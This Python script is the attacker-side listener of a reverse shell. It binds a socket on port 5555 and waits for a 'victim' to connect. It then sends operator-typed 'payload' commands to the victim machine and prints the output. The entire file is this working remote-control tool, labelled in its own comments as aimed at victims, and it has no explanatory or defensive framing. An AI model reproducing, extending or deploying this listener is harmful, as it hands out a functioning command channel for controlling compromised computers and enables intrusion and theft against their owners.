import socket

# STATIC VARIABLES
PORT = 5555
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER,PORT)

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind(ADDR)

# Listening for victim to connect
server_socket.listen(1)
print(f'Server listening on {SERVER}')

while True:
    # Accepting the connection to connect with victim
    victim_socket, client_addr = server_socket.accept()
    command_ = input("Enter payload: ")
    victim_socket.send(command_.encode('utf-8'))
    victim_data = victim_socket.recv(4096).decode('utf-8').replace('\n','')
    print(victim_data)